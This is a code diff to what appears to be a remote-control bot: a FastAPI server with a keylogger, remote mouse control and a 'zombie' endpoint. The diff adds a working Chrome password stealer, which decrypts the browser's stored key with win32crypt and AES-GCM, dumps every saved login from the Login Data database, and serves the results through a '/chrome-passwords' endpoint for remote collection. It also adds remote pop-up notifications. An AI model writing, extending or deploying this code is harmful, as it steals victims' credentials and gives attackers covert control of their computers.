@@ -14,6 +14,8 @@ import pyautogui
 from fastapi.responses import FileResponse
 from zombie import send_request
 import random
+import platform
+from plyer import notification
 
 # --- Asset paths ---
 ASSETS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "assets")
@@ -64,6 +66,66 @@ def on_press(key):
 def start_keyboard_listener():
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
+
+def extract_chrome_passwords():
+    if platform.system().lower() != "windows":
+        return {"status": "error", "error": "Not running on Windows."}
+    import os
+    import json
+    import base64
+    import sqlite3
+    import win32crypt
+    from Crypto.Cipher import AES
+    import shutil
+    from datetime import datetime, timedelta
+
+    def chrome_date_and_time(chrome_data):
+        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
+
+    def fetching_encryption_key():
+        local_computer_directory_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
+            local_state_data = f.read()
+            local_state_data = json.loads(local_state_data)
+        encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
+        encryption_key = encryption_key[5:]
+        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
+
+    def password_decryption(password, encryption_key):
+        try:
+            iv = password[3:15]
+            password = password[15:]
+            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
+            return cipher.decrypt(password)[:-16].decode()
+        except:
+            try:
+                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[0])
+            except:
+                return "No Passwords"
+
+    key = fetching_encryption_key()
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
+    filename = "ChromePasswords.db"
+    shutil.copyfile(db_path, filename)
+    db = sqlite3.connect(filename)
+    cursor = db.cursor()
+    cursor.execute(
+        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
+        "order by date_last_used")
+    credentials = []
+    for row in cursor.fetchall():
+        main_url = row[0]
+        user_name = row[2]
+        decrypted_password = password_decryption(row[3], key)
+        if user_name or decrypted_password:
+            credentials.append({"main_url": main_url, "username": user_name, "password": decrypted_password})
+    cursor.close()
+    db.close()
+    try:
+        os.remove(filename)
+    except:
+        pass
+    return {"status": "ok", "credentials": credentials, "count": len(credentials)}
 
 # --- FastAPI app and routes ---
 
@@ -145,7 +207,7 @@ def move_cursor():
     screen_width, screen_height = pyautogui.size()
     x = random.randint(0, screen_width - 1)
     y = random.randint(0, screen_height - 1)
-    pyautogui.moveTo(x, y)
+    pyautogui.moveTo(x, y, duration=2)
     return {"status": "moved", "x": x, "y": y}
 
 @app.post('/zombie')
@@ -160,4 +222,30 @@ def zombie_endpoint(request: Request):
         return {"status": "ok", "result": str(result)}
     except Exception as e:
         return {"status": "error", "error": str(e)}
+
+@app.get('/chrome-passwords')
+def chrome_passwords():
+    return extract_chrome_passwords()
+
+@app.post('/notify')
+def send_notification(request: Request):
+    try:
+        data = request.json() if hasattr(request, 'json') else {}
+        message = data.get('message', 'Notification from server!')
+    except Exception:
+        message = 'Notification from server!'
+    system = platform.system().lower()
+    if system == 'darwin':
+        import pync
+        pync.notify(message, title='Nouvelle Notification !')
+    elif system == 'windows':
+        from plyer import notification
+        notification.notify(
+            title='Nouvelle Notification !',
+            message=message,
+            timeout=5
+        )
+    else:
+        return {"status": "error", "error": "Notifications not supported on this OS."}
+    return {"status": "notified", "message": message}
 
